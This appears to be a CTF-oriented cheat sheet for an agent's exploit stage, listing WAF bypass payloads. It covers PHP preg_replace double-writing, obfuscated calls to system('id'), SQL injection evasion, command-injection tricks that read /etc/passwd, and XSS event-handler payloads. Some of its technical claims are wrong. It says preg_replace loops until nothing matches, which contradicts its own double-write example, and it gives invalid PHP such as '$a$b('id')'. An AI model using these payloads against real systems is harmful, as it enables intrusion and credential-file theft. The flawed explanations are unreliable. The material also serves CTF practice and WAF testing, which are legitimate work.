# stage: exploit
# category: core

> WAF bypass technique library — bypass methods for various WAFs

# WAF Bypass Technique Library

## PHP WAF Bypass

### preg_replace Double-Write Bypass (Key Technique)

`preg_replace()` **replaces in a loop** until there are no more matches, but if replacing a keyword **spells out a new keyword**, only the inner part is replaced while the outer part is preserved.

**Core principle**: `preg_replace('/NSSCTF/', '', 'NSSNSSCTFCTF')` → removes the middle `NSSCTF` → leaves `NSS` + `CTF` = `NSSCTF`

**General template**:
```
Assume the filtered keyword is X (e.g., NSSCTF)
Construct the input: split X into two halves, embed the full X in the middle
That is: first half of X + X + second half of X

Examples:
Filtering NSSCTF → input NSS + NSSCTF + CTF = NSSNSSCTFCTF
Filtering flag   → input fl + flag + ag = flflagag
Filtering cat    → input ca + cat + t = cacatt
Filtering system → input sys + system + tem = syssystemtem
```

**Why simple case-mixing bypass does not work against preg_replace**:
- `preg_replace('/NSSCTF/', '', 'NssCTF')` → `Nss` does not match `NSS` (no i modifier) → outputs `NssCTF` unchanged
- `NssCTF !== "NSSCTF"` (strict comparison fails) → rejected
- Only the double-write bypass makes the replacement result **exactly equal to the original keyword string**

**⚠️ How to recognize the scenario**:
- The source code contains `preg_replace('/keyword/', '', $input)` and requires `$input` after replacement to **equal the keyword itself** → immediately use the double-write bypass
- Do not try case-mixing bypass (the replaced result does not equal the original keyword) or encoding bypass (an encoded string does not equal the original keyword)

### Function Name Obfuscation
- Base64 decode and restore: `$f=base64_decode('c3lzdGVt');$f('id');`
- String concatenation: `$f='sys'.'tem';$f('id');`
- Variable functions: `$a='sys';$b='tem';$a$b('id');`

### Keyword Bypass
- Split the path: `'/va'.'r/ww'.'w/ht'.'ml'`
- Comment bypass: `sys/**/tem('id');`
- Reverse the string: `$f=strrev('metsys');$f('id');`

## SQL Injection Bypass

### Keyword Bypass
- Mixed case: `SeLeCt` instead of `SELECT`
- Inline comments: `S/*!ELECT*/`
- Double encoding: `%2565` → `%65` → `e`
- Equivalent functions: `GROUP_CONCAT` instead of `concat_ws`

### Comment Character Variants
- `-- -` instead of `--`
- `--+` instead of `-- `
- `#` instead of `--`

## Command Injection Bypass

### Separator Variants
- Newline: `id\nwhoami`
- Pipe: `id|whoami`
- Logical operators: `id&&whoami`
- Subshell: `$(id)` or `` `id` ``

### Command Obfuscation
- Variable concatenation: `a=i;b=d;$a$b`
- Wildcards: `/bin/ca? /etc/pas?d`
- Empty variables: `c'a't /etc/passwd`
- Escaping: `c\at /etc/passwd`

## XSS Bypass

### Tag Variants
- `<img src=x onerror=alert(1)>`
- `<svg onload=alert(1)>`
- `<body onload=alert(1)>`
- `<input onfocus=alert(1) autofocus>`

### Event Handlers
- `onerror`, `onload`, `onclick`, `onfocus`, `onmouseover`

### Encoding Bypass
- HTML entity encoding
- Unicode encoding
- Base64 encoding (combined with eval)
